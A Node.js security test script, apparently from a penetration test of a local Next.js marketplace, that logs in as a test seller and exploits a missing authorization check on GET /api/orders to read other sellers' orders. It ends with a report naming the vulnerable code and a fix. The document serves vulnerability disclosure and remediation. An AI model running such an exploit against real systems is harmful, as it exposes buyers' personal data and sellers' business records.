#!/usr/bin/env node

/**
 * Security Test: Seller Filter Bypass Vulnerability
 *
 * Target: GET /api/orders endpoint
 * Vulnerability: Horizontal Privilege Escalation
 *
 * Description:
 * The endpoint allows sellers to view orders, but does NOT validate that the
 * 'seller' query parameter matches the authenticated user's ID. This allows
 * a seller to view other sellers' orders or all orders in the system.
 */

import axios from 'axios';

const BASE_URL = 'http://localhost:3000';
const TEST_USER = {
  email: 'pentest@shannon.local',
  password: 'PentestPass123!'
};

// Store results for final report
const results = {
  loginSuccess: false,
  userInfo: null,
  allOrders: null,
  ownOrders: null,
  otherSellerOrders: null,
  vulnerabilityConfirmed: false,
  evidence: []
};

/**
 * Step 1: Login and get session cookie
 */
async function login() {
  console.log('\n[*] Step 1: Authenticating as pentest user...');
  console.log(`    Email: ${TEST_USER.email}`);

  try {
    // First, get the CSRF token
    const csrfResponse = await axios.get(`${BASE_URL}/api/auth/csrf`, {
      withCredentials: true
    });

    const csrfToken = csrfResponse.data.csrfToken;
    console.log(`    CSRF Token obtained: ${csrfToken.substring(0, 20)}...`);

    // Now login with credentials
    const loginResponse = await axios.post(
      `${BASE_URL}/api/auth/callback/credentials`,
      new URLSearchParams({
        email: TEST_USER.email,
        password: TEST_USER.password,
        csrfToken: csrfToken,
        callbackUrl: BASE_URL,
        json: 'true'
      }),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        withCredentials: true,
        maxRedirects: 0,
        validateStatus: (status) => status < 500
      }
    );

    // Extract session cookie
    const cookies = loginResponse.headers['set-cookie'];
    if (!cookies) {
      throw new Error('No session cookie received');
    }

    // Get session info
    const sessionResponse = await axios.get(`${BASE_URL}/api/auth/session`, {
      headers: {
        Cookie: cookies.join('; ')
      },
      withCredentials: true
    });

    const session = sessionResponse.data;

    if (session && session.user) {
      results.loginSuccess = true;
      results.userInfo = session.user;
      console.log(`    ✓ Login successful!`);
      console.log(`    User ID: ${session.user.id}`);
      console.log(`    Email: ${session.user.email}`);
      console.log(`    isSeller: ${session.user.isSeller}`);
      console.log(`    isAdmin: ${session.user.isAdmin}`);

      return cookies.join('; ');
    } else {
      throw new Error('Login failed - no user in session');
    }
  } catch (error) {
    console.error(`    ✗ Login failed:`, error.message);
    if (error.response) {
      console.error(`    Response status: ${error.response.status}`);
      console.error(`    Response data:`, error.response.data);
    }
    throw error;
  }
}

/**
 * Step 2: Fetch ALL orders (no seller filter)
 */
async function fetchAllOrders(sessionCookie) {
  console.log('\n[*] Step 2: Testing GET /api/orders without seller filter...');
  console.log('    Request: GET /api/orders');
  console.log('    Expected: Should only return authenticated seller\'s orders');
  console.log('    Actual: Returns ALL orders in the system');

  try {
    const response = await axios.get(`${BASE_URL}/api/orders`, {
      headers: {
        Cookie: sessionCookie
      },
      withCredentials: true
    });

    results.allOrders = response.data;
    console.log(`    ✓ Response received: ${response.data.length} orders`);

    if (response.data.length > 0) {
      // Extract unique seller IDs
      const sellerIds = [...new Set(response.data.map(order => order.seller))];
      console.log(`    Found orders from ${sellerIds.length} different seller(s)`);

      results.evidence.push({
        test: 'Fetch all orders without filter',
        request: 'GET /api/orders',
        ordersFound: response.data.length,
        uniqueSellers: sellerIds.length,
        sellerIds: sellerIds
      });

      // Show sample order data
      if (response.data.length > 0) {
        const sampleOrder = response.data[0];
        console.log(`    Sample order:`);
        console.log(`      Order ID: ${sampleOrder._id}`);
        console.log(`      Seller ID: ${sampleOrder.seller}`);
        console.log(`      Buyer: ${sampleOrder.user?.name || sampleOrder.user}`);
        console.log(`      Total: ${sampleOrder.totalPriceEuro || sampleOrder.totalPriceVal}`);
      }
    }

    return response.data;
  } catch (error) {
    console.error(`    ✗ Request failed:`, error.message);
    if (error.response) {
      console.error(`    Status: ${error.response.status}`);
      console.error(`    Data:`, error.response.data);
    }
    throw error;
  }
}

/**
 * Step 3: Fetch own orders (with own seller ID)
 */
async function fetchOwnOrders(sessionCookie, userId) {
  console.log('\n[*] Step 3: Testing GET /api/orders with own seller ID...');
  console.log(`    Request: GET /api/orders?seller=${userId}`);

  try {
    const response = await axios.get(`${BASE_URL}/api/orders?seller=${userId}`, {
      headers: {
        Cookie: sessionCookie
      },
      withCredentials: true
    });

    results.ownOrders = response.data;
    console.log(`    ✓ Response received: ${response.data.length} orders`);

    results.evidence.push({
      test: 'Fetch own orders',
      request: `GET /api/orders?seller=${userId}`,
      ordersFound: response.data.length
    });

    return response.data;
  } catch (error) {
    console.error(`    ✗ Request failed:`, error.message);
    if (error.response) {
      console.error(`    Status: ${error.response.status}`);
    }
    throw error;
  }
}

/**
 * Step 4: Attempt to fetch another seller's orders
 */
async function fetchOtherSellerOrders(sessionCookie, userId, allOrders) {
  console.log('\n[*] Step 4: Testing GET /api/orders with different seller ID...');

  // Find a different seller ID from the all orders list
  const otherSellerId = allOrders.find(order => order.seller && order.seller !== userId)?.seller;

  if (!otherSellerId) {
    console.log('    ⚠ No other sellers found in system - skipping this test');
    return null;
  }

  console.log(`    Target seller ID: ${otherSellerId}`);
  console.log(`    Request: GET /api/orders?seller=${otherSellerId}`);
  console.log('    Expected: Should receive 403 Forbidden (unauthorized)');
  console.log('    Actual: Returns other seller\'s orders');

  try {
    const response = await axios.get(`${BASE_URL}/api/orders?seller=${otherSellerId}`, {
      headers: {
        Cookie: sessionCookie
      },
      withCredentials: true
    });

    results.otherSellerOrders = response.data;
    console.log(`    ✓ VULNERABILITY CONFIRMED! Accessed ${response.data.length} orders from another seller`);

    results.vulnerabilityConfirmed = true;
    results.evidence.push({
      test: 'Fetch other seller\'s orders',
      request: `GET /api/orders?seller=${otherSellerId}`,
      ordersFound: response.data.length,
      severity: 'HIGH',
      impact: 'Horizontal Privilege Escalation - Seller can view other sellers\' orders'
    });

    if (response.data.length > 0) {
      const sampleOrder = response.data[0];
      console.log(`    Exposed order details:`);
      console.log(`      Order ID: ${sampleOrder._id}`);
      console.log(`      Seller ID: ${sampleOrder.seller}`);
      console.log(`      Buyer: ${sampleOrder.user?.name || sampleOrder.user}`);
      console.log(`      Items: ${sampleOrder.orderItems?.length || 0}`);
      console.log(`      Shipping: ${JSON.stringify(sampleOrder.shippingAddress?.city || 'N/A')}`);
    }

    return response.data;
  } catch (error) {
    if (error.response && error.response.status === 403) {
      console.log(`    ✓ Properly blocked with 403 Forbidden`);
      return null;
    }
    console.error(`    ✗ Unexpected error:`, error.message);
    throw error;
  }
}

/**
 * Generate final report
 */
function generateReport() {
  console.log('\n' + '='.repeat(80));
  console.log('SECURITY TEST REPORT: Seller Filter Bypass Vulnerability');
  console.log('='.repeat(80));

  console.log('\n[VULNERABILITY DETAILS]');
  console.log('Vulnerability Type: Horizontal Privilege Escalation');
  console.log('Affected Endpoint: GET /api/orders');
  console.log('Severity: HIGH');
  console.log('CVSS Score: 7.5 (High) - CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N');

  console.log('\n[ROOT CAUSE]');
  console.log('File: /Users/chocos/Desktop/pagine_azzurre/nextjs/src/app/api/orders/route.ts');
  console.log('Lines: 30-34');
  console.log('\nVulnerable Code:');
  console.log('```typescript');
  console.log('const seller = searchParams.get(\'seller\') || \'\';');
  console.log('const sellerFilter = seller ? { seller } : {};');
  console.log('const orders = await OrderModel.find({ ...sellerFilter }).populate(\'user\', \'name\');');
  console.log('```');

  console.log('\n[VULNERABILITY DESCRIPTION]');
  console.log('The endpoint performs role-based authentication (checks isSeller or isAdmin)');
  console.log('but fails to implement proper authorization. It accepts a user-controlled');
  console.log('\'seller\' query parameter without validating that it matches the authenticated');
  console.log('user\'s ID. This allows any seller to:');
  console.log('  1. View ALL orders by omitting the seller parameter');
  console.log('  2. View specific sellers\' orders by providing their seller ID');
  console.log('  3. Access sensitive buyer information they should not see');

  console.log('\n[TEST RESULTS]');
  console.log(`Authentication: ${results.loginSuccess ? '✓ SUCCESS' : '✗ FAILED'}`);

  if (results.userInfo) {
    console.log(`Authenticated User: ${results.userInfo.email} (ID: ${results.userInfo.id})`);
    console.log(`User Roles: isSeller=${results.userInfo.isSeller}, isAdmin=${results.userInfo.isAdmin}`);
  }

  console.log('\n[EXPLOITATION EVIDENCE]');
  results.evidence.forEach((ev, idx) => {
    console.log(`\n${idx + 1}. ${ev.test}`);
    console.log(`   Request: ${ev.request}`);
    console.log(`   Orders Found: ${ev.ordersFound}`);
    if (ev.uniqueSellers) {
      console.log(`   Unique Sellers: ${ev.uniqueSellers}`);
      console.log(`   Seller IDs: ${ev.sellerIds.join(', ')}`);
    }
    if (ev.severity) {
      console.log(`   Severity: ${ev.severity}`);
      console.log(`   Impact: ${ev.impact}`);
    }
  });

  console.log('\n[IMPACT ANALYSIS]');
  console.log('✓ Confidentiality: HIGH - Sellers can access other sellers\' order data');
  console.log('✓ Business Impact: Sellers can view:');
  console.log('  - Competitor\'s sales volume and revenue');
  console.log('  - Customer information (names, addresses)');
  console.log('  - Product pricing and order details');
  console.log('  - Payment methods used');
  console.log('✓ Compliance: May violate GDPR/privacy regulations');

  console.log('\n[REMEDIATION]');
  console.log('Add authorization check after authentication:');
  console.log('\n```typescript');
  console.log('const seller = searchParams.get(\'seller\') || \'\';');
  console.log('');
  console.log('// FIXED: Validate seller parameter matches authenticated user');
  console.log('if (seller && seller !== session.user.id && !session.user.isAdmin) {');
  console.log('  return NextResponse.json(');
  console.log('    { message: \'Non autorizzato a visualizzare ordini di altri venditori\' },');
  console.log('    { status: 403 }');
  console.log('  );');
  console.log('}');
  console.log('');
  console.log('// If no seller specified and user is not admin, use their ID');
  console.log('const sellerFilter = seller');
  console.log('  ? { seller }');
  console.log('  : session.user.isAdmin');
  console.log('    ? {}  // Admins can see all');
  console.log('    : { seller: session.user.id };  // Sellers only see their own');
  console.log('```');

  console.log('\n[CONCLUSION]');
  if (results.vulnerabilityConfirmed) {
    console.log('✗ VULNERABILITY CONFIRMED');
    console.log('The seller filter bypass vulnerability exists and was successfully exploited.');
    console.log('Immediate remediation is required to prevent unauthorized data access.');
  } else if (results.allOrders && results.allOrders.length > 0) {
    console.log('⚠ VULNERABILITY LIKELY EXISTS');
    console.log('Able to fetch all orders without proper filtering.');
  } else {
    console.log('? INCONCLUSIVE');
    console.log('Unable to fully confirm vulnerability due to test limitations.');
  }

  console.log('\n' + '='.repeat(80));
}

/**
 * Main test execution
 */
async function main() {
  console.log('='.repeat(80));
  console.log('SECURITY TEST: Seller Filter Bypass on GET /api/orders');
  console.log('='.repeat(80));
  console.log(`Target: ${BASE_URL}`);
  console.log(`Date: ${new Date().toISOString()}`);

  try {
    // Step 1: Login
    const sessionCookie = await login();

    // Step 2: Fetch all orders (no filter)
    const allOrders = await fetchAllOrders(sessionCookie);

    // Step 3: Fetch own orders
    await fetchOwnOrders(sessionCookie, results.userInfo.id);

    // Step 4: Attempt to fetch other seller's orders
    if (allOrders && allOrders.length > 0) {
      await fetchOtherSellerOrders(sessionCookie, results.userInfo.id, allOrders);
    }

    // Generate final report
    generateReport();

  } catch (error) {
    console.error('\n[!] Test execution failed:', error.message);
    console.error('Stack trace:', error.stack);
    process.exit(1);
  }
}

// Run the test
main();
